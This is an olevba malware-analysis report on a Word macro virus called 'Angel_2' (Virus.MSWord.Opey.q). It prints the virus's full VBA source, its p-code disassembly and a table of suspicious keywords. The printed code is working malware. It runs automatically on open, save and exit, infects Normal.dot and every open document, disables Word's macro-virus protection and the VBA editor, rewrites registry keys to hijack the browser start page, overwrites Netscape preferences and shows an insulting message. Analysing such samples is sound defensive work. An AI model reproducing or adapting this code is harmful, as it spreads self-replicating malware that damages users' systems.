olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey.q
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey.q - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Angel_2.bas 
in file: Virus.MSWord.Opey.q - OLE stream: 'Macros/VBA/Angel_2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'// Netscape User Preferences
'// This is a generated file!  Do not edit.'
'
'user_pref("browser.startup.homepage", "http://www.escalix.com/freepage/angel");
'user_pref("browser.startup.homepage_override", false);
'user_pref("browser.wfe.ignore_def_check", true);
'user_pref("browser.window_rect", "0,0,632,480");
'user_pref("custtoolbar.personal_toolbar_folder", "Personal Toolbar Folder");
'user_pref("ldap_2.servers.infospace.csid", "UTF-8");
'user_pref("ldap_2.servers.infospace.filename", "infospace.na2");
'user_pref("ldap_2.servers.infospace.replication.lastChangeNumber", 0);
'user_pref("ldap_2.servers.netcenter.csid", "UTF-8");
'user_pref("ldap_2.servers.netcenter.filename", "netcenter.na2");
'user_pref("ldap_2.servers.netcenter.replication.lastChangeNumber", 0);
'user_pref("ldap_2.servers.pab.csid", "iso-8859-1");
'user_pref("ldap_2.servers.pab.filename", "pab.na2");
'user_pref("ldap_2.servers.pab.replication.lastChangeNumber", 0);
'user_pref("ldap_2.servers.verisign.csid", "UTF-8");
'user_pref("ldap_2.servers.verisign.filename", "verisign.na2");
'user_pref("ldap_2.servers.verisign.replication.lastChangeNumber", 0);
'user_pref("ldap_2.version", 2);
'user_pref("taskbar.x", 634);
'user_pref("taskbar.y", 5);

Sub AutoOpen()                  ' coded by D@rkByte
    Call stealth                ' Undetected by Norton Anti-virus 5.0, Dr. Sol. Antivirus
    On Error Resume Next        '   Tbav, and other shits
    Call clascopy               ' Copyaright 1999
    ActiveDocument.Save         ' Comments or Suggestions mailto: avenging.angel@mailcity.com
End Sub                         'Payload: change the Owner's Computer name
Sub AutoExec()                  '         on friday it will ask a question to be answered
    Call stealth                '         after 9/9/99 printing will print all the pages on a document
    On Error Resume Next        '         changes the home of the internet explorer to my site
    Call clascopy
    ActiveDocument.Save
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Call clascopy
    Application.UserName = "Another infected of Angel Virus"
    Application.UserAddress = "Hacker From Batangas"
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FilePageSetup()
    On Error Resume Next
    Call clascopy
    Dialogs(wdDialogFilePageSetup).Show
End Sub
Sub FilePrint()
    On Error Resume Next
    Call clascopy
    Dialogs(wdDialogFilePrint).Show
End Sub
Sub FileOpen()
    On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Call clascopy
    ActiveDocument.Save
End Sub
Sub AutoClose()
    On Error Resume Next
    Call clascopy
End Sub
Sub AutoExit()
    On Error Resume Next
    Call clascopy
    Application.Quit
End Sub
Sub FileSave()
    On Error Resume Next
    Call clascopy
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call clascopy
    If ActiveDocument.Words(1) <> "" _
    And ActiveDocument.Saved = False Then
    ActiveDocument.Save
    End If
    ActiveDocument.Close
End Sub
Sub FileExit()
    On Error Resume Next
    Call clascopy
    If ActiveDocument.Words(1) <> "" And _
    ActiveDocument.Saved = False Then
    ActiveDocument.Save
    End If
    Call payload
    Application.Quit
End Sub
Sub FileNew()
    On Error Resume Next
    Dialogs(wdDialogFileNew).Show
    Call clascopy
End Sub

Sub clascopy()
   On Error Resume Next
   Call stealth
    infected = False
        For A_A = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
            modname = NormalTemplate.VBProject.VBComponents(A_A).Name
                If modname = "Angel_2" Then infected = True
                If (modname <> "Angel_2") And (modname <> "ThisDocument") Then
                    Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=modname, Object:=wdOrganizerObjectProjectItems
                End If
        Next A_A
        For Each documentopen In Documents
            Docinfected = False
            With documentopen
                For Angelclaw = documentopen.VBProject.VBComponents.Count To 1 Step -1
                modname = documentopen.VBProject.VBComponents(Angelclaw).Name
                    If modname = "Angel_2" Then Docinfected = True
                    If (modname <> "Angel_2") And (modname <> "ThisDocument") And (modname <> "Reference to Normal") Then
                        Application.OrganizerDelete Source:=documentopen.FullName, Name:=modname, Object:=wdOrganizerObjectProjectItems
                    End If
                Next Angelclaw
                If Docinfected = False Then
                     e = NormalTemplate.VBProject.VBComponents(2).CodeModule.CountOfLines
                    vircode = NormalTemplate.VBProject.VBComponents(2).CodeModule.Lines(1, e)
                    documentopen.VBProject.VBComponents.Add(1).Name = "Angel_2"
                    documentopen.VBProject.VBComponents(2).CodeModule.InsertLines 1, vircode
                End If
            End With
        Next documentopen
            If infected = False Then
                e = ActiveDocument.VBProject.VBComponents(2).CodeModule.CountOfLines
                    vircode = ActiveDocument.VBProject.VBComponents(2).CodeModule.Lines(1, e)
                    NormalTemplate.VBProject.VBComponents.Add(1).Name = "Angel_2"
                    NormalTemplate.VBProject.VBComponents(2).CodeModule.InsertLines 1, vircode
                    NormalTemplate.Save
                    Call payload2
            End If

End Sub
Sub stealth()
   On Error Resume Next
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
    CommandBars("tools").Reset
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    CommandBars("Tools").Controls("Macro").Enabled = False
    CommandBars("Tools").Controls("Customize...").Enabled = False
    CommandBars("Tools").Controls("Templates and Add-Ins...").Enabled = False
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    ActiveDocument.ReadOnlyRecommended = False
    Application.UserName = "Another infected of Angel Virus"
    Application.UserAddress = "Hacker From Batangas"
    Dialogs(wdDialogFileSummaryInfo).Author = "Another infected of Angel Virus"
    Dialogs(wdDialogFileSummaryInfo).Title = "Angel_2"
    Dialogs(wdDialogFileSummaryInfo).Execute
    System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Internet Explorer\Main", _
    "Start Page") = "www.escalix.com/freepage/angel"
     System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\WINDOWS\CURRENTVERSION", _
    "RegisteredOwner") = "Avenging Angel :)"
    System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0", "DisplayName") = _
    "Infected with Angel Virus"
    Call payload2
End Sub

Sub payload()
aname = System.PrivateProfileString("", _
    "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "DefName")

If WeekDay(Date) = 4 Then MsgBox "Angel (ein-dzel)- a divine messenger of GOD" & Chr(13) & aname & " Sucks", 0, "from a Hacker from Batangas 'Too Many Secrets'"
End Sub
Sub payload2()
    auto$ = Dir("c:\Program Files\Netscape\users\default\*.js")
    startwrite = FreeFile
    If auto$ <> "" Then
        ChDir ("c:\Program Files\Netscape\users\default\")
        Open auto$ For Output Access Write As startwrite
        For x = 1 To 22
        ww = ActiveDocument.VBProject.VBComponents(2).CodeModule.Lines(x, 1)
        zz = Mid(ww, 2, Len(ww))
        Print #startwrite, zz
        Next x
        Close #startwrite
    End If
End Sub
















-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Opey.q
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/Angel_2 - 12788 bytes
' Line #0:
' 	QuoteRem 0x0000 0x001C "// Netscape User Preferences"
' Line #1:
' 	QuoteRem 0x0000 0x002B "// This is a generated file!  Do not edit.'"
' Line #2:
' 	QuoteRem 0x0000 0x0000 ""
' Line #3:
' 	QuoteRem 0x0000 0x004F "user_pref("browser.startup.homepage", "http://www.escalix.com/freepage/angel");"
' Line #4:
' 	QuoteRem 0x0000 0x0036 "user_pref("browser.startup.homepage_override", false);"
' Line #5:
' 	QuoteRem 0x0000 0x0030 "user_pref("browser.wfe.ignore_def_check", true);"
' Line #6:
' 	QuoteRem 0x0000 0x0030 "user_pref("browser.window_rect", "0,0,632,480");"
' Line #7:
' 	QuoteRem 0x0000 0x004C "user_pref("custtoolbar.personal_toolbar_folder", "Personal Toolbar Folder");"
' Line #8:
' 	QuoteRem 0x0000 0x0034 "user_pref("ldap_2.servers.infospace.csid", "UTF-8");"
' Line #9:
' 	QuoteRem 0x0000 0x0040 "user_pref("ldap_2.servers.infospace.filename", "infospace.na2");"
' Line #10:
' 	QuoteRem 0x0000 0x0046 "user_pref("ldap_2.servers.infospace.replication.lastChangeNumber", 0);"
' Line #11:
' 	QuoteRem 0x0000 0x0034 "user_pref("ldap_2.servers.netcenter.csid", "UTF-8");"
' Line #12:
' 	QuoteRem 0x0000 0x0040 "user_pref("ldap_2.servers.netcenter.filename", "netcenter.na2");"
' Line #13:
' 	QuoteRem 0x0000 0x0046 "user_pref("ldap_2.servers.netcenter.replication.lastChangeNumber", 0);"
' Line #14:
' 	QuoteRem 0x0000 0x0033 "user_pref("ldap_2.servers.pab.csid", "iso-8859-1");"
' Line #15:
' 	QuoteRem 0x0000 0x0034 "user_pref("ldap_2.servers.pab.filename", "pab.na2");"
' Line #16:
' 	QuoteRem 0x0000 0x0040 "user_pref("ldap_2.servers.pab.replication.lastChangeNumber", 0);"
' Line #17:
' 	QuoteRem 0x0000 0x0033 "user_pref("ldap_2.servers.verisign.csid", "UTF-8");"
' Line #18:
' 	QuoteRem 0x0000 0x003E "user_pref("ldap_2.servers.verisign.filename", "verisign.na2");"
' Line #19:
' 	QuoteRem 0x0000 0x0045 "user_pref("ldap_2.servers.verisign.replication.lastChangeNumber", 0);"
' Line #20:
' 	QuoteRem 0x0000 0x001F "user_pref("ldap_2.version", 2);"
' Line #21:
' 	QuoteRem 0x0000 0x001C "user_pref("taskbar.x", 634);"
' Line #22:
' 	QuoteRem 0x0000 0x001A "user_pref("taskbar.y", 5);"
' Line #23:
' Line #24:
' 	FuncDefn (Sub AutoOpen())
' 	QuoteRem 0x0020 0x0012 " coded by D@rkByte"
' Line #25:
' 	ArgsCall (Call) stealth 0x0000 
' 	QuoteRem 0x0020 0x0038 " Undetected by Norton Anti-virus 5.0, Dr. Sol. Antivirus"
' Line #26:
' 	OnError (Resume Next) 
' 	QuoteRem 0x0020 0x0018 "   Tbav, and other shits"
' Line #27:
' 	ArgsCall (Call) clascopy 0x0000 
' 	QuoteRem 0x0020 0x0010 " Copyaright 1999"
' Line #28:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	QuoteRem 0x0020 0x003C " Comments or Suggestions mailto: avenging.angel@mailcity.com"
' Line #29:
' 	EndSub 
' 	QuoteRem 0x0020 0x0029 "Payload: change the Owner's Computer name"
' Line #30:
' 	FuncDefn (Sub AutoExec())
' 	QuoteRem 0x0020 0x0038 "         on friday it will ask a question to be answered"
' Line #31:
' 	ArgsCall (Call) stealth 0x0000 
' 	QuoteRem 0x0020 0x0045 "         after 9/9/99 printing will print all the pages on a document"
' Line #32:
' 	OnError (Resume Next) 
' 	QuoteRem 0x0020 0x003D "         changes the home of the internet explorer to my site"
' Line #33:
' 	ArgsCall (Call) clascopy 0x0000 
' Line #34:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub FileSaveAs())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) clascopy 0x0000 
' Line #39:
' 	LitStr 0x001F "Another infected of Angel Virus"
' 	Ld Application 
' 	MemSt UserName 
' Line #40:
' 	LitStr 0x0014 "Hacker From Batangas"
' 	Ld Application 
' 	MemSt UserAddress 
' Line #41:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #42:
' 	EndSub 
' Line #43:
' 	FuncDefn (Sub FilePageSetup())
' Line #44:
' 	OnError (Resume Next) 
' Line #45:
' 	ArgsCall (Call) clascopy 0x0000 
' Line #46:
' 	Ld wdDialogFilePageSetup 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub FilePrint())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) clascopy 0x0000 
' Line #51:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #52:
' 	EndSub 
' Line #53:
' 	FuncDefn (Sub FileOpen())
' Line #54:
' 	OnError (Resume Next) 
' Line #55:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #56:
' 	ArgsCall (Call) clascopy 0x0000 
' Line #57:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #58:
' 	EndSub 
' Line #59:
' 	FuncDefn (Sub AutoClose())
' Line #60:
' 	OnError (Resume Next) 
' Line #61:
' 	ArgsCall (Call) clascopy 0x0000 
' Line #62:
' 	EndSub 
' Line #63:
' 	FuncDefn (Sub AutoExit())
' Line #64:
' 	OnError (Resume Next) 
' Line #65:
' 	ArgsCall (Call) clascopy 0x0000 
' Line #66:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #67:
' 	EndSub 
' Line #68:
' 	FuncDefn (Sub FileSave())
' Line #69:
' 	OnError (Resume Next) 
' Line #70:
' 	ArgsCall (Call) clascopy 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #72:
' 	EndSub 
' Line #73:
' 	FuncDefn (Sub FileClose())
' Line #74:
' 	OnError (Resume Next) 
' Line #75:
' 	ArgsCall (Call) clascopy 0x0000 
' Line #76:
' 	LineCont 0x0004 09 00 04 00
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemLd Words 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #77:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #78:
' 	EndIfBlock 
' Line #79:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #80:
' 	EndSub 
' Line #81:
' 	FuncDefn (Sub FileExit())
' Line #82:
' 	OnError (Resume Next) 
' Line #83:
' 	ArgsCall (Call) clascopy 0x0000 
' Line #84:
' 	LineCont 0x0004 0A 00 04 00
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemLd Words 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #85:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #86:
' 	EndIfBlock 
' Line #87:
' 	ArgsCall (Call) payload 0x0000 
' Line #88:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #89:
' 	EndSub 
' Line #90:
' 	FuncDefn (Sub FileNew())
' Line #91:
' 	OnError (Resume Next) 
' Line #92:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #93:
' 	ArgsCall (Call) clascopy 0x0000 
' Line #94:
' 	EndSub 
' Line #95:
' Line #96:
' 	FuncDefn (Sub clascopy())
' Line #97:
' 	OnError (Resume Next) 
' Line #98:
' 	ArgsCall (Call) stealth 0x0000 
' Line #99:
' 	LitVarSpecial (False)
' 	St infected 
' Line #100:
' 	StartForVariable 
' 	Ld A_A 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #101:
' 	Ld A_A 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St modname 
' Line #102:
' 	Ld modname 
' 	LitStr 0x0007 "Angel_2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St infected 
' 	EndIf 
' Line #103:
' 	Ld modname 
' 	LitStr 0x0007 "Angel_2"
' 	Ne 
' 	Paren 
' 	Ld modname 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #104:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld modname 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #105:
' 	EndIfBlock 
' Line #106:
' 	StartForVariable 
' 	Ld A_A 
' 	EndForVariable 
' 	NextVar 
' Line #107:
' 	StartForVariable 
' 	Ld documentopen 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #108:
' 	LitVarSpecial (False)
' 	St Docinfected 
' Line #109:
' 	StartWithExpr 
' 	Ld documentopen 
' 	With 
' Line #110:
' 	StartForVariable 
' 	Ld Angelclaw 
' 	EndForVariable 
' 	Ld documentopen 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #111:
' 	Ld Angelclaw 
' 	Ld documentopen 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St modname 
' Line #112:
' 	Ld modname 
' 	LitStr 0x0007 "Angel_2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Docinfected 
' 	EndIf 
' Line #113:
' 	Ld modname 
' 	LitStr 0x0007 "Angel_2"
' 	Ne 
' 	Paren 
' 	Ld modname 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld modname 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #114:
' 	Ld documentopen 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld modname 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #115:
' 	EndIfBlock 
' Line #116:
' 	StartForVariable 
' 	Ld Angelclaw 
' 	EndForVariable 
' 	NextVar 
' Line #117:
' 	Ld Docinfected 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #118:
' 	LitDI2 0x0002 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St e 
' Line #119:
' 	LitDI2 0x0001 
' 	Ld e 
' 	LitDI2 0x0002 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St vircode 
' Line #120:
' 	LitStr 0x0007 "Angel_2"
' 	LitDI2 0x0001 
' 	Ld documentopen 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Add 0x0001 
' 	MemSt New 
' Line #121:
' 	LitDI2 0x0001 
' 	Ld vircode 
' 	LitDI2 0x0002 
' 	Ld documentopen 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #122:
' 	EndIfBlock 
' Line #123:
' 	EndWith 
' Line #124:
' 	StartForVariable 
' 	Ld documentopen 
' 	EndForVariable 
' 	NextVar 
' Line #125:
' 	Ld infected 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #126:
' 	LitDI2 0x0002 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St e 
' Line #127:
' 	LitDI2 0x0001 
' 	Ld e 
' 	LitDI2 0x0002 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St vircode 
' Line #128:
' 	LitStr 0x0007 "Angel_2"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Add 0x0001 
' 	MemSt New 
' Line #129:
' 	LitDI2 0x0001 
' 	Ld vircode 
' 	LitDI2 0x0002 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #130:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #131:
' 	ArgsCall (Call) payload2 0x0000 
' Line #132:
' 	EndIfBlock 
' Line #133:
' Line #134:
' 	EndSub 
' Line #135:
' 	FuncDefn (Sub stealth())
' Line #136:
' 	OnError (Resume Next) 
' Line #137:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #138:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #139:
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #140:
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemCall Reset 0x0000 
' Line #141:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #142:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #143:
' 	Ld msoBarNoChangeVisible 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #144:
' 	Ld msoBarNoCustomize 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #145:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #146:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Customize..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #147:
' 	LitVarSpecial (False)
' 	LitStr 0x0018 "Templates and Add-Ins..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #148:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #149:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #150:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #151:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #152:
' 	LitStr 0x001F "Another infected of Angel Virus"
' 	Ld Application 
' 	MemSt UserName 
' Line #153:
' 	LitStr 0x0014 "Hacker From Batangas"
' 	Ld Application 
' 	MemSt UserAddress 
' Line #154:
' 	LitStr 0x001F "Another infected of Angel Virus"
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	MemSt Author 
' Line #155:
' 	LitStr 0x0007 "Angel_2"
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	MemSt Title 
' Line #156:
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Execute 0x0000 
' Line #157:
' 	LineCont 0x0004 08 00 04 00
' 	LitStr 0x001E "www.escalix.com/freepage/angel"
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_USERS\.Default\Software\Microsoft\Internet Explorer\Main"
' 	LitStr 0x000A "Start Page"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #158:
' 	LineCont 0x0004 08 00 04 00
' 	LitStr 0x0011 "Avenging Angel :)"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\WINDOWS\CURRENTVERSION"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #159:
' 	LineCont 0x0004 0B 00 04 00
' 	LitStr 0x0019 "Infected with Angel Virus"
' 	LitStr 0x0000 ""
' 	LitStr 0x0057 "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0"
' 	LitStr 0x000B "DisplayName"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #160:
' 	ArgsCall (Call) payload2 0x0000 
' Line #161:
' 	EndSub 
' Line #162:
' Line #163:
' 	FuncDefn (Sub payload())
' Line #164:
' 	LineCont 0x0004 08 00 04 00
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0007 "DefName"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St aname 
' Line #165:
' Line #166:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x002B "Angel (ein-dzel)- a divine messenger of GOD"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld aname 
' 	Concat 
' 	LitStr 0x0006 " Sucks"
' 	Concat 
' 	LitDI2 0x0000 
' 	LitStr 0x002E "from a Hacker from Batangas 'Too Many Secrets'"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #167:
' 	EndSub 
' Line #168:
' 	FuncDefn (Sub payload2())
' Line #169:
' 	LitStr 0x002C "c:\Program Files\Netscape\users\default\*.js"
' 	ArgsLd Dir 0x0001 
' 	St auto$ 
' Line #170:
' 	Ld Friend 
' 	St startwrite 
' Line #171:
' 	Ld auto$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #172:
' 	LitStr 0x0028 "c:\Program Files\Netscape\users\default\"
' 	Paren 
' 	ArgsCall ChDir 0x0001 
' Line #173:
' 	Ld auto$ 
' 	Ld startwrite 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #174:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0016 
' 	For 
' Line #175:
' 	Ld x 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St ww 
' Line #176:
' 	Ld ww 
' 	LitDI2 0x0002 
' 	Ld ww 
' 	FnLen 
' 	ArgsLd Mid$ 0x0003 
' 	St zz 
' Line #177:
' 	Ld startwrite 
' 	Sharp 
' 	PrintChan 
' 	Ld zz 
' 	PrintItemNL 
' Line #178:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #179:
' 	Ld startwrite 
' 	Sharp 
' 	Close 0x0001 
' Line #180:
' 	EndIfBlock 
' Line #181:
' 	EndSub 
' Line #182:
' Line #183:
' Line #184:
' Line #185:
' Line #186:
' Line #187:
' Line #188:
' Line #189:
' Line #190:
' Line #191:
' Line #192:
' Line #193:
' Line #194:
' Line #195:
' Line #196:
' Line #197:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |documentopen        |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
